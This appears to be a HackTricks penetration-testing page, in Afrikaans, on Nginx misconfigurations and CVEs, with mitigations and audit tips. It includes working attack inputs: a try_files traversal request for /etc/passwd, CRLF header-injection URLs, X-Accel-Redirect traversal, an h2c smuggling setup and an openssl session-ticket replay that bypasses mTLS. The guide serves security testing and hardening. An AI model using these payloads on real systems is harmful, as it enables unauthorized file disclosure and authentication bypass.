# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Ontbrekende root-lokasie <a href="#missing-root-location" id="missing-root-location"></a>

Wanneer die Nginx-bediener gekonfigureer word, speel die **root directive** 'n kritieke rol deur die basisgids te definieer waarvan lêers bedien word. Oorweeg die volgende voorbeeld:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
In hierdie konfigurasie is `/etc/nginx` aangewys as die root-gids. Hierdie opstelling laat toe dat lêers binne die gespesifiseerde root-gids, soos `/hello.txt`, bereik word. Dit is egter belangrik om op te let dat slegs 'n spesifieke location (`/hello.txt`) gedefinieer is. Daar is geen konfigurasie vir die root-lokasie (`location / {...}`) nie. Hierdie weglating beteken dat die `root`-direktief wêreldwyd van toepassing is, wat versoeke na die root-pad `/` in staat stel om lêers onder `/etc/nginx` te bereik.

Hierdie konfigurasie bring 'n kritieke sekuriteitsrisiko mee. 'n Eenvoudige `GET` versoek, soos `GET /nginx.conf`, kan sensitiewe inligting blootstel deur die Nginx-konfigurasielêer by `/etc/nginx/nginx.conf` te bedien. Om die risiko te verminder kan die `root` na 'n minder sensitiewe gids soos `/etc` gestel word, maar dit kan steeds onbedoelde toegang tot ander kritieke lêers moontlik maak, insluitend ander konfigurasielêers, toeganglogs, en selfs geënkripteerde credentials wat vir HTTP basic authentication gebruik word.

## Alias LFI Misconfiguratie <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

In die konfigurasielêers van Nginx moet die "location"-direktiewe noukeurig nagegaan word. 'n kwesbaarheid bekend as Local File Inclusion (LFI) kan per ongeluk geïntroduseer word deur 'n konfigurasie wat soos die volgende lyk:
```
location /imgs {
alias /path/images/;
}
```
Hierdie konfigurasie is vatbaar vir LFI attacks omdat die server versoeke soos `/imgs../flag.txt` interpreteer as 'n poging om toegang tot lêers buite die beoogde gids te kry, wat effektief oplos na `/path/images/../flag.txt`. Hierdie fout stel attackers in staat om lêers vanaf die server se lêerstelsel te verkry wat nie via die web toeganklik behoort te wees nie.

Om hierdie kwesbaarheid te versag, moet die konfigurasie aangepas word om:
```
location /imgs/ {
alias /path/images/;
}
```
Meer inligting: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix toetse:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Onveilige padbeperking <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Kyk na die volgende bladsy om te leer hoe om directives soos die volgende te bypass:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Onveilige veranderlike gebruik / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Kwetsbare veranderlikes `$uri` en `$document_ur`i; dit kan reggemaak word deur dit te vervang met `$request_uri`.
>
> ’n regex kan ook kwesbaar wees soos:
>
> `location ~ /docs/([^/])? { … $1 … }` - Kwetsbaar
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Nie kwetsbaar (kontroleer spasies)
>
> `location ~ /docs/(.*)? { … $1 … }` - Nie kwetsbaar

’n Kwesbaarheid in Nginx-konfigurasie word gedemonstreer deur die voorbeeld hieronder:
```
location / {
return 302 https://example.com$uri;
}
```
Die karakters \r (Carriage Return) en \n (Line Feed) dui nuwe reël-karakters in HTTP-versoeke aan, en hul URL-gekodeerde vorme word voorgestel as `%0d%0a`. Wanneer hierdie karakters in 'n versoek ingesluit word (bv. `http://localhost/%0d%0aDetectify:%20clrf`) na 'n verkeerd gekonfigureerde bediener, lei dit daartoe dat die bediener 'n nuwe header met die naam `Detectify` uitreik. Dit gebeur omdat die $uri variable die URL-gekodeerde nuwe reël-karakters dekodeer, wat lei tot 'n onverwagte header in die reaksie:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Lees meer oor die risiko's van CRLF injection en response splitting by [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Hierdie tegniek word ook [**uitgebeeld in hierdie praatjie**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) met ’n paar kwesbare voorbeelde en opsporingsmeganismes. Byvoorbeeld, om hierdie misconfiguratie vanaf ’n blackbox-perspektief te ontdek, kan jy die volgende versoeke gebruik:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

As dit kwesbaar is, sal die eerste terugkeer aangesien "X" enige HTTP-metode is en die tweede sal ’n fout teruggee aangesien H nie ’n geldige metode is nie. Dus sal die bediener iets soos ontvang: `GET / H HTTP/1.1` en dit sal die fout veroorsaak.

Nog ’n opsporingsvoorbeeld sou wees:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Sommige kwesbare konfigurasies wat in daardie praatjie gevind is, was:

- Let op hoe **`$uri`** onveranderd in die finale URL gestel word
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Let op hoe weer **`$uri`** in die URL is (hierdie keer binne 'n parameter)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Nou in AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Enige veranderlike

Daar is ontdek dat **deur die gebruiker verskafde data** onder sekere omstandighede as 'n **Nginx variable** behandel kan word. Die oorsaak van hierdie gedrag bly ietwat onduidelik, maar dit is nie skaars nie en ook nie eenvoudig om te verifieer nie. Hierdie anomalie is uitgelig in 'n sekuriteitsverslag op HackerOne, wat jy [hier](https://hackerone.com/reports/370094) kan sien. Verdere ondersoek na die foutboodskap het gelei tot die identifisering van die voorkoms binne die [SSI filter module van Nginx se codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), wat Server Side Includes (SSI) as die hoofoorsaak aandui.

Om hierdie miskonfigurasie te **ontdek**, kan die volgende opdrag uitgevoer word, wat 'n Referer-header stel om te toets of 'n variable uitgegee word:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Skanderings vir hierdie misconfiguratie oor stelsels het verskeie gevalle aan die lig gebring waar Nginx variables deur 'n gebruiker vertoon kon word. 'n Afname in die aantal kwetsbare instansies dui egter daarop dat pogings om hierdie probleem te patch ietwat suksesvol was.

### Gebruik van try_files met $URI$ARGS variables

Die volgende Nginx misconfiguratie kan lei tot 'n LFI vulnerability:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
In ons konfigurasie het ons die direktief `try_files` wat gebruik word om die bestaan van lêers in 'n gespesifiseerde volgorde te kontroleer. Nginx sal die eerste lêer wat hy vind bedien. Die basiese sintaksis van die `try_files`-direktief is soos volg:
```
try_files file1 file2 ... fileN fallback;
```
Nginx sal die bestaan van elke lêer in die gespesifiseerde volgorde nagaan. As ’n lêer bestaan, sal dit onmiddellik bedien word. As geen van die gespesifiseerde lêers bestaan nie, sal die versoek na die fallback-opsie gestuur word, wat ’n ander URI of ’n spesifieke foutblad kan wees.

Wanneer die $uri$args veranderlikes in hierdie direktief gebruik word, sal Nginx probeer om na ’n lêer te kyk wat ooreenstem met die versoek-URI gekombineer met enige query string-argumente. Daarom kan ons hierdie konfigurasie uitbuit:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Met die volgende payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Deur ons payload te gebruik, ontsnap ons uit die root-gids (gedefinieer in Nginx-konfigurasie) en laai die `/etc/passwd`-lêer. In debug-logs kan ons waarneem hoe Nginx die lêers probeer:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC teen Nginx gebruik die konfigurasie hierbo genoem:
![Voorbeeld burp versoek](../../images/nginx_try_files.png)

## Lees van ruwe backend-antwoord

Nginx bied 'n funksie deur middel van `proxy_pass` aan wat die onderschepping van foute en HTTP-headers wat deur die backend geproduseer word moontlik maak, met die doel om interne foutboodskappe en headers te verberg. Dit word bereik deurdat Nginx pasgemaakte foutbladsye bedien as reaksie op backend-foute. Probleme ontstaan egter wanneer Nginx op 'n ongeldig HTTP-versoek bots. So 'n versoek word soos ontvang na die backend deurgestuur, en die backend se ruwe reaksie word dan direk na die kliënt gestuur sonder Nginx se tussenkoms.

Oorweeg 'n voorbeeldscenario wat 'n uWSGI-toepassing betrek:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Om dit te bestuur, word spesifieke direktiewe in die Nginx-konfigurasie gebruik:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Hierdie direktief stel Nginx in staat om 'n pasgemaakte reaksie te lewer vir backend responses met 'n statuskode groter as 300. Dit verseker dat, vir ons voorbeeld uWSGI toepassing, 'n `500 Error` reaksie gekeer en deur Nginx hanteer word.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Soos die naam aandui, verberg hierdie direktief gespesifiseerde HTTP headers van die client, wat privaatheid en veiligheid verbeter.

Wanneer 'n geldige `GET` versoek gemaak word, verwerk Nginx dit normaalweg en gee 'n standaard foutreaksie terug sonder om enige geheime headers te openbaar. 'n Ongeldige HTTP versoek omseil egter hierdie meganisme, wat lei tot die blootstelling van rou backend responses, insluitende geheime headers en foutboodskappe.

## merge_slashes set to off

By verstek is Nginx se **`merge_slashes` directive** gestel op **`on`**, wat meervoudige vorentoe-skyfsels in 'n URL saamdruk tot 'n enkele skyfsel. Hierdie funksie, terwyl dit URL-verwerking vereenvoudig, kan onbedoeld kwesbaarhede in toepassings agter Nginx verberg, veral dié wat geneig is tot local file inclusion (LFI) attacks. Sekuriteitskundiges **Danny Robinson and Rotem Bar** het die potensiële risiko's gehighlight wat met hierdie verstekgedrag geassosieer word, veral wanneer Nginx as 'n reverse-proxy optree.

Om sulke risiko's te verminder, word dit aanbeveel om die **`merge_slashes` directive af te skakel** vir toepassings wat vatbaar is vir hierdie kwesbaarhede. Dit verseker dat Nginx versoeke aan die toepassing deurgee sonder om die URL-struktuur te verander, en sodoende nie onderliggende sekuriteitsprobleme maskeer nie.

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Reaksiehoofde**

Soos getoon in [**this writeup**](https://mizu.re/post/cors-playground), is daar sekere headers wat, as hulle in die reaksie van die webbediener voorkom, die gedrag van die Nginx proxy sal verander. Jy kan hulle [**in die docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/) nagaan:

- `X-Accel-Redirect`: Gee aan Nginx om 'n versoek intern na 'n gespesifiseerde ligging te herlei.
- `X-Accel-Buffering`: Beheer of Nginx die reaksie moet buffer of nie.
- `X-Accel-Charset`: Stel die karakterstel vir die reaksie wanneer X-Accel-Redirect gebruik word.
- `X-Accel-Expires`: Stel die vervaltyd vir die reaksie in wanneer X-Accel-Redirect gebruik word.
- `X-Accel-Limit-Rate`: Beperk die oordragtempo vir reaksies wanneer X-Accel-Redirect gebruik word.

Byvoorbeeld, die header **`X-Accel-Redirect`** sal 'n interne **redirect** in die nginx veroorsaak. Dus, 'n nginx konfigurasie met iets soos **`root /`** en 'n reaksie van die webbediener met **`X-Accel-Redirect: .env`** sal nginx laat die inhoud van **`/.env`** stuur (Path Traversal).

### **Default Value in Map Directive**

In die **Nginx configuration**, speel die `map` directive dikwels 'n rol in **authorization control**. 'n Algemene fout is om nie 'n **default** waarde te spesifiseer nie, wat tot ongemagtigde toegang kan lei. Byvoorbeeld:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Sonder 'n `default` kan 'n **malicious user** sekuriteit omseil deur toegang te kry tot 'n **undefined URI** binne `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) raai aan om 'n **default value** te stel om sulke probleme te vermy.

### **DNS Spoofing Vulnerability**

DNS spoofing teen Nginx is moontlik onder sekere voorwaardes. As 'n attacker die **DNS server** wat deur Nginx gebruik word ken en sy DNS queries kan onderskep, kan hulle DNS records spoof. Hierdie metode is egter ondoeltreffend as Nginx gekonfigureer is om **localhost (127.0.0.1)** vir DNS-resolusie te gebruik. Nginx laat toe om 'n DNS server soos volg te spesifiseer:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` en `internal` Direktiewe**

Die **`proxy_pass`** direktief word gebruik om versoeke na ander servers te herlei, hetsy intern of ekstern. Die **`internal`** direktief verseker dat sekere lokasies slegs binne Nginx toeganklik is. Alhoewel hierdie direktiewe op sigself nie kwesbaarhede is nie, verg hul konfigurasie noukeurige ondersoek om veiligheidsgebreke te voorkom.

## proxy_set_header Upgrade & Connection

As die nginx-server gekonfigureer is om die Upgrade- en Connection-headers deur te gee, kan 'n [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) uitgevoer word om toegang tot beskermde/interne endpoints te kry.

> [!CAUTION]
> Hierdie kwesbaarheid sou 'n aanvaller toelaat om 'n direkte verbinding met die `proxy_pass` endpoint te vestig (`http://backend:9999` in hierdie geval) waarvan die inhoud nie deur nginx geverifieer gaan word nie.

Voorbeeld van 'n kwesbare konfigurasie om `/flag` te steel vanaf [hier](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Let wel dat selfs al sou die `proxy_pass` na 'n spesifieke **pad** soos `http://backend:9999/socket.io` wys, sal die verbinding tot stand gebring word met `http://backend:9999`, so jy kan **enige ander pad binne daardie interne eindpunt kontak. Dit maak dus nie saak of 'n pad in die URL van proxy_pass gespesifiseer is nie.**

## HTTP/3 QUIC module remote DoS & leak (2024)

Tydens 2024 het Nginx CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 en CVE-2024-35200 bekendgemaak, wat wys dat 'n enkele vyandige QUIC-sessie worker-processes kan laat crash of leak memory wanneer die eksperimentele `ngx_http_v3_module` saamgebou is en 'n `listen ... quic` socket blootgestel is. Geaffekteerde builds is 1.25.0–1.25.5 en 1.26.0, terwyl 1.27.0/1.26.1 die fixes bevat; die memory disclosure (CVE-2024-34161) vereis verder MTU's groter as 4096 bytes om sensitiewe data aan die lig te bring (besonderhede in die 2024 nginx advisory hieronder verwys).

**Recon & exploitation hints**

- HTTP/3 is opt-in, so skandeer vir `Alt-Svc: h3=":443"` antwoorde of brute-force UDP/443 QUIC-handshakes; sodra dit bevestig is, fuzz die handshake en STREAM-frames met pasgemaakte `quiche-client`/`nghttp3` payloads om worker-crashes te veroorsaak en log leakage af te dwing.
- Vinnig fingerprint die teiken se ondersteuning met:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS sessie-herskakeling omseiling van client cert auth (CVE-2025-23419)

In 'n Februarie 2025 advisering is bekend gemaak dat nginx 1.11.4–1.27.3, gebou met OpenSSL, toelaat om **'n TLS 1.3 sessie** van een name-based virtual host binne 'n ander te hergebruik, sodat 'n kliënt wat met 'n sertifikaat-vrye host 'n sessie onderhandel het, die ticket/PSK kan herafspeel om na 'n vhost beskerm deur `ssl_verify_client on;` te spring en mTLS heeltemal oor te slaan. Die fout tree op wanneer meerdere virtual hosts dieselfde TLS 1.3 session cache en tickets deel (sien die 2025 nginx advisory hieronder).

**Aanvaller speelboek**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
As die teiken kwesbaar is, voltooi die tweede handshake sonder om 'n kliëntsertifikaat voor te lê, wat beskermde ligginge openbaar.

**Wat om te oudit**

- Gemengde `server_name` blokke wat `ssl_session_cache shared:SSL` plus `ssl_session_tickets on;` deel.
- Admin/API-blokke wat mTLS verwag maar gedeelde session cache/ticket-instellings van openbare hosts oorneem.
- Outomatisering wat TLS 1.3 session resumption globaal aktiveer (bv. Ansible roles) sonder om vhost-isolasie in ag te neem.

## HTTP/2 Rapid Reset resilience (CVE-2023-44487 behavior)

Die HTTP/2 Rapid Reset-aanval (CVE-2023-44487) raak nog steeds nginx wanneer operateurs `keepalive_requests` of `http2_max_concurrent_streams` bo die verstekwaardes ophou verhoog: 'n aanvaller open een HTTP/2-verbinding, oorlaai dit met duisende streams, en stuur dan onmiddellik `RST_STREAM`-frames sodat die concurrency-plafon nooit bereik word nie terwyl die CPU aanhou brand op tear-down logika. Nginx-verstekwaardes (128 concurrent streams, 1000 keepalive requests) hou die blast radius klein; om daardie perke "substantieel hoër" te stoot maak dit maklik om workers selfs vanaf 'n enkele kliënt te verhonger (sien die F5 write-up hieronder).

**Opsporingswenke**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Gashere wat ongewone hoë waardes vir daardie direktiewe openbaar, is ideale teikens: een HTTP/2 kliënt kan in 'n lus deur stroomskepping en onmiddellike `RST_STREAM`-rame gaan om die CPU vas te hou sonder om die concurrency cap te tref.

## Probeer dit self

Detectify het 'n GitHub-repository geskep waar jy Docker kan gebruik om jou eie kwesbare Nginx-toetsbediener met sommige van die misconfigurasies wat in hierdie artikel bespreek is, op te stel en self te probeer vind!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Statische analise-instrumente

### [GIXY](https://github.com/yandex/gixy)

Gixy is 'n hulpmiddel om Nginx-konfigurasies te ontleed. Die hoofdoel van Gixy is om sekuriteitsmisconfigurasies te voorkom en foutopsporing te outomatiseer.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner is 'n eenvoudige hulpmiddel om na algemene Nginx-misconfigurasies en kwesbaarhede te soek.

## Verwysings

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
